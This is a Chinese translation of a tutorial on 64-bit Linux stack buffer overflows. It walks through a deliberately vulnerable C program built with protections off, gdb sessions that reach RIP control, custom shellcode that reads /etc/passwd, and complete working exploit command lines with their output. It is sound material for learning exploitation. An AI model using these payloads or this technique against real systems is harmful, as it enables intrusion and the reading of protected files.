# 64位Linux下的栈溢出

from:http://packetstormsecurity.com/files/download/127007/64bit-overflow.pdf

* * *

本文的目的是让大家学到64位缓冲区溢出的基础知识。 作者Mr.Un1k0d3r RingZer0 Team

摘要

```
0x01 x86和x86_64的区别
0x02 漏洞代码片段
0x03 触发溢出
0x04 控制RIP
0x05 跳入用户控制的缓冲区
0x06 执行shellcode
0x07 GDB vs 现实
0x08 结语

```

0x01 x86和x86_64的区别
------------------

* * *

第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也只能使用前47位要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分。

事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。

0x02 漏洞代码片段
-----------

* * *

```
int main(int argc, char **argv) { 
      char buffer[256];
      if(argc != 2) {
            exit(0);
      }
      printf("%p\n", buffer);
      strcpy(buffer,  argv[1]);
      printf("%s\n", buffer);
      return 0;
}

```

为了节省漏洞利用的时间我决定打印缓冲区指针地址。

你可以用gcc编译上述代码。

```
$ gcc -m64 bof.c -o bof -z execstack -fno-stack-protector

```

这样就一切妥当了。

0x03 触发溢出
---------

* * *

首先我们来确认一下确实可以让这个进程崩溃。

```
$ ./bof $(python -c 'print "A" * 300')
0x7fffffffdcd0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

```

好来确认一下我们控制的RIP指令指针

![enter image description here](http://drops.javaweb.org/uploads/images/645e95441e1cab73159c13861d89b1704b0a8a61.jpg)

你可以通过stepi单步执行来过一遍程序流程译者应该用ni比较合适。 当过了strcpy调用(0x40066c)之后你会发现当前缓冲区指针指向0x7fffffffdc90而不是0x7fffffffdcd0这是gdb的环境变量和其他东西造成的。不过现在我们不关心之后会解决的。 重要的说明* 在之后的内容中当我提到leave指令时就是指的上面的地址0x400685。 最后这是strcpy过后的栈

```
(gdb) x/20xg $rsp 
0x7fffffffdc80: 0x00007fffffffde78 0x00000002f7ffe520 
0x7fffffffdc90: 0x4141414141414141 0x4141414141414141 
0x7fffffffdca0: 0x4141414141414141 0x4141414141414141 
0x7fffffffdcb0: 0x4141414141414141 0x4141414141414141 
0x7fffffffdcc0: 0x4141414141414141 0x4141414141414141 
0x7fffffffdcd0: 0x4141414141414141 0x4141414141414141 
0x7fffffffdce0: 0x4141414141414141 0x4141414141414141 
0x7fffffffdcf0: 0x4141414141414141 0x4141414141414141 
0x7fffffffdd00: 0x4141414141414141 0x4141414141414141 
0x7fffffffdd10: 0x4141414141414141 0x4141414141414141 

```

接着主函数(main)中的leave指令把rsp指向0x7fffffffdd98。 栈就变成了这样子

```
(gdb) x/20xg $rsp 
0x7fffffffdd98: 0x4141414141414141 0x4141414141414141 
0x7fffffffdda8: 0x4141414141414141 0x4141414141414141 
0x7fffffffddb8: 0x0000000041414141 0x0000000000000000 
0x7fffffffddc8: 0xa1c4af9213d095db 0x0000000000400520 
0x7fffffffddd8: 0x00007fffffffde70 0x0000000000000000 
0x7fffffffdde8: 0x0000000000000000 0x5e3b506da89095db 
0x7fffffffddf8: 0x5e3b40d4af2a95db 0x0000000000000000 
0x7fffffffde08: 0x0000000000000000 0x0000000000000000 
0x7fffffffde18: 0x0000000000400690 0x00007fffffffde78 
0x7fffffffde28: 0x0000000000000002 0x0000000000000000 
(gdb) stepi 
Program received signal SIGSEGV, Segmentation fault.

```

好极了我们有SIGSEGV的时机去查看当前寄存器的值。

```
(gdb) i r 
rax     0x0     0 
rbx     0x0     0 
rcx     0xffffffffffffffff  -1  
rdx     0x7ffff7dd59e0 140737351866848 
rsi     0x7ffff7ff7000 140737354100736 
rdi     0x1     1 
rbp     0x4141414141414141 0x4141414141414141 
rsp     0x7fffffffdd98  0x7fffffffdd98 
r8      0x4141414141414141 4702111234474983745 
r9      0x4141414141414141 4702111234474983745 
r10     0x4141414141414141 4702111234474983745 
r11     0x246 582 
r12     0x400520 4195616 
r13     0x7fffffffde70 140737488346736 
r14     0x0     0 
r15     0x0     0 
rip     0x400686 0x400686 <main+121> 
eflags  0x10246  [ PF ZF IF RF ] 
cs      0x33    51 
ss      0x2b    43 
ds      0x0     0 
es      0x0     0 
fs      0x0     0 
gs      0x0     0 

(gdb) stepi 
Program terminated with signal SIGSEGV, Segmentation fault. 
The program no longer exists. 

```

好了程序就这样结束了我们没能控制RIP为什么因为我们覆盖了太多位记得最大的地址是0x00007fffffffffff吧而我们尝试用0x4141414141414141去溢出了。

0x04 控制RIP
----------

* * *

我们发现了个小问题不过只要是问题总有办法解决的我们可以用个小一点的缓冲区去溢出这样指向rsp的地址就会像0x0000414141414141一样了。 通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于0x7fffffffdc90。Leave指令之后rsp将指向0x7fffffffdd98。

```
0x7fffffffdd98 - 0x7fffffffdc90 = 0x108 -> 十进制的264

```

知道了这些我们可以把溢出载荷修改成这样

```
"A" * 264 + "B" * 6

```

rsp指向的地址应该像0x0000424242424242一样正常了。那样就能控制RIP。

```
$ gdb -tui bof 
(gdb) set disassembly-flavor intel 
(gdb) layout asm 
(gdb) layout regs 
(gdb) break main 
(gdb) run $(python -c 'print "A" * 264 + "B" * 6') 

```

这次我们直接看调用leave指令后的状况。 这是leave指令执行后的栈

```
(gdb) x/20xg $rsp 
0x7fffffffddb8: 0x0000424242424242 0x0000000000000000 
0x7fffffffddc8: 0x00007fffffffde98 0x0000000200000000 
0x7fffffffddd8: 0x000000000040060d 0x0000000000000000 
0x7fffffffdde8: 0x2a283aca5f708a47 0x0000000000400520 
0x7fffffffddf8: 0x00007fffffffde90 0x0000000000000000 
0x7fffffffde08: 0x0000000000000000 0xd5d7c535e4f08a47 
0x7fffffffde18: 0xd5d7d58ce38a8a47 0x0000000000000000 
0x7fffffffde28: 0x0000000000000000 0x0000000000000000 
0x7fffffffde38: 0x0000000000400690 0x00007fffffffde98 
0x7fffffffde48: 0x0000000000000002 0x0000000000000000 

```

这是leave指令执行后寄存器的值

```
(gdb) i r 
rax     0x0     0 
rbx     0x0     0 
rcx     0xffffffffffffffff  -1 
rdx     0x7ffff7dd59e0 140737351866848 
rsi     0x7ffff7ff7000 140737354100736 
rdi     0x1     1 
rbp     0x4141414141414141 0x4141414141414141 
rsp     0x7fffffffddb8  0x7fffffffddb8 
r8      0x4141414141414141 4702111234474983745 
r9      0x4141414141414141 4702111234474983745 
r10     0x4141414141414141 4702111234474983745 
r11     0x246 r12 0x400520 4195616 
r13     0x7fffffffde90 140737488346768 
r14     0x0     0 
r15     0x0     0 
rip     0x400686 0x400686 <main+121>  
eflags  0x246 [ PF ZF IF ] 
cs      0x33    51 
ss      0x2b    43 
ds      0x0     0 
es      0x0     0 
fs      0x0     0 
gs      0x0     0 

```

rsp指向0x7fffffffddb8而0x7fffffffddb8的内容就是0x0000424242424242。看来一切正常是时候执行ret指令了。

```
(gdb) stepi 
Cannot access memory at address 0x424242424242 
Cannot access memory at address 0x424242424242 
(gdb) i r 
rax     0x0     0 
rbx     0x0     0 
rcx     0xffffffffffffffff  -1 
rdx     0x7ffff7dd59e0 140737351866848 
rsi     0x7ffff7ff7000 140737354100736 
rdi     0x1     1 
rbp     0x4141414141414141   0x4141414141414141 
rsp     0x7fffffffddc0  0x7fffffffddc0 
r8      0x4141414141414141 4702111234474983745 
r9      0x4141414141414141 4702111234474983745 
r10     0x4141414141414141 4702111234474983745 
r11     0x246   582 
r12     0x400520 4195616 
r13     0x7fffffffde90 140737488346768 
r14     0x0     0 
r15     0x0     0 
rip     0x424242424242  0x424242424242 
eflags  0x246 [ PF ZF IF ] 
cs      0x33    51 
ss      0x2b    43 
ds      0x0     0 
es      0x0     0 
fs      0x0     0 
gs      0x0     0 

```

我们最终控制了rip

0x05 跳入用户控制的缓冲区
---------------

* * *

事实上这部分内容没什么特别的或者新的东西你只需要指向你控制的缓冲区开头。也就是第一个printf显示出来的值在这里是0x7fffffffdc90。通过gdb也可以很容易地重新获得这个值你只需在调用strcpy之后显示栈。

```
(gdb) x/4xg $rsp 
0x7fffffffdc80: 0x00007fffffffde98 0x00000002f7ffe520 
0x7fffffffdc90: 0x4141414141414141 0x4141414141414141 

```

是时候更新我们的载荷了。新的载荷看起来像这样

```
"A" * 264 + "\x7f\xff\xff\xff\xdc\x90"[::-1] 

```

因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。

确认下我们跳入正确的地址。

```
$ gdb -tui bof 
(gdb) set disassembly-flavor intel 
(gdb) layout asm 
(gdb) layout regs 
(gdb) break main 
(gdb) run $(python -c 'print "A" * 264 +  
"\x7f\xff\xff\xff\xdc\x90"[::-1]') 
(gdb) x/20xg $rsp 
0x7fffffffddb8: 0x00007fffffffdc90  0x0000000000000000 
0x7fffffffddc8: 0x00007fffffffde98 0x0000000200000000 
0x7fffffffddd8: 0x000000000040060d 0x0000000000000000 
0x7fffffffdde8: 0xe72f39cd325155ac 0x0000000000400520 
0x7fffffffddf8: 0x00007fffffffde90 0x0000000000000000 
0x7fffffffde08: 0x0000000000000000 0x18d0c63289d155ac 
0x7fffffffde18: 0x18d0d68b8eab55ac 0x0000000000000000 
0x7fffffffde28: 0x0000000000000000 0x0000000000000000 
0x7fffffffde38: 0x0000000000400690 0x00007fffffffde98 
0x7fffffffde48: 0x0000000000000002 0x0000000000000000 

```

这是执行leave指令后的栈。如我们所知rsp指向0x7fffffffddb8。0x7fffffffddb8的内容是0x00007fffffffdc90。最后0x00007fffffffdc90指向我们控制的缓冲区。

```
(gdb) stepi 

```

ret指令执行后rip指向0x7fffffffdc90这意味着我们跳入了正确的位置。

0x06 执行shellcode
----------------

* * *

在这个例子中我准备用个定制的shellcode去读/etc/passwd的内容。

```
BITS 64 
; Author Mr.Un1k0d3r - RingZer0 Team 
; Read /etc/passwd Linux x86_64 Shellcode 
; Shellcode size 82 bytes 
global _start 
section .text 
_start: 
    jmp _push_filename 

_readfile: 
    ; syscall open file 
    pop rdi   ; pop path value 
    ; NULL byte fix 
    xor byte [rdi + 11], 0x41 

    xor rax, rax 
    add al, 2 
    xor rsi, rsi  ; set O_RDONLY flag 
    syscall 

    ; syscall read file 
    sub sp, 0xfff 
    lea rsi, [rsp] 
    mov rdi, rax 
    xor rdx, rdx 
    mov dx, 0xfff   ; size to read 
    xor rax, rax 
    syscall 

    ; syscall write to stdout 
    xor rdi, rdi 
    add dil, 1 ; set stdout fd = 1 
    mov rdx, rax 
    xor rax, rax 
    add al, 1 
    syscall 

    ; syscall exit 
    xor rax, rax 
    add al, 60 
    syscall 

_push_filename: 
    call _readfile 
    path: db "/etc/passwdA" 

```

接下来汇编这个文件然后提取shellcode。

```
$ nasm -f elf64 readfile.asm -o readfile.o 
$ for i in $(objdump  -d readfile.o | grep "^ " | cut  -f2); do echo  -n  '\x'$i; done; echo 
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x6 
6\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x 
0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\ 
xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f 
\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41 

```

这个shellcode长82字节。来构造最终的载荷吧。

原来的载荷

```
$(python -c 'print "A" * 264 + "\x7f\xff\xff\xff\xdc\x90"[::-1]') 

```

我们要保证一样的大小所以264 - 82 = 182

```
$(python -c 'print "A" * 182 + "\x7f\xff\xff\xff\xdc\x90"[::-1]') 

```

然后把shellcode接在开头

```
$(python -c 'print  
"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x 
66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\ 
x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31 
\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2 
f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + "A" * 182 +  
"\x7f\xff\xff\xff\xdc\x90"[::-1]') 

```

来把所有东西一块儿测试

```
$ gdb –tui bof 
(gdb) run $(python -c 'print  
"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x 
66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\ 
x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31 
\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2 
f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + "A" * 182 +  
"\x7f\xff\xff\xff\xdc\x90"[::-1]') 

```

如果一切正常你就会看到/etc/passwd的内容。要注意内存地址是可以变化的这样可能就和我这里的不同了。

0x07 GDB vs 现实
--------------

* * *

因为gdb会初始化一些变量和其他的东西所以如果你试着在gdb之外使用同样的利用脚本就会失败。不过在这个例子中我加了个对printf的调用来输出缓冲区指针。这样我们就可以很容易地找到正确的值并且在真实的环境中获得地址。

这是使用我们在gdb中找到的值的真实版本

```
$ ./bof $(python -c 'print "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31 
\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34 
\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05 
\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f 
\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74 
\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + "A" * 182 +  
"\x7f\xff\xff\xff\xdc\x90"[::-1]') 
0x7fffffffdcf0 
?_w 

AH1H1fH4$HH1fH1H1@HH1H1< 
/etc/passwdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAA• 
Illegal instruction (core dumped) 

```

很显然利用不成功。因为地址已经从0x7fffffffdc90变成了0x7fffffffdcf0。幸好有这点printf的输出我们只需用正确的值调整一下载荷。

```
$ ./bof $(python -c 'print "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31 
\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34 
\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05 
\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f 
\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74 
\x63\x2f\x70\x61\x73\x73\x77\x64\x41" + "A" * 182 +  
"\x7f\xff\xff\xff\xdc\xf0"[::-1]') 
0x7fffffffdcf0 
?_w 

AH1H1fH4$HH1fH1H1@HH1H1< 
/etc/passwdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAA• 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 

```

换成正确的值之后利用一切正常。

0x08 结语
-------

* * *

希望你们能喜欢这篇关于Linux下x86_64缓冲区溢出的文章，有很多关于x86溢出的文章了，但64位的溢出比较少见。

祝你们拿到好多好多shell!

感谢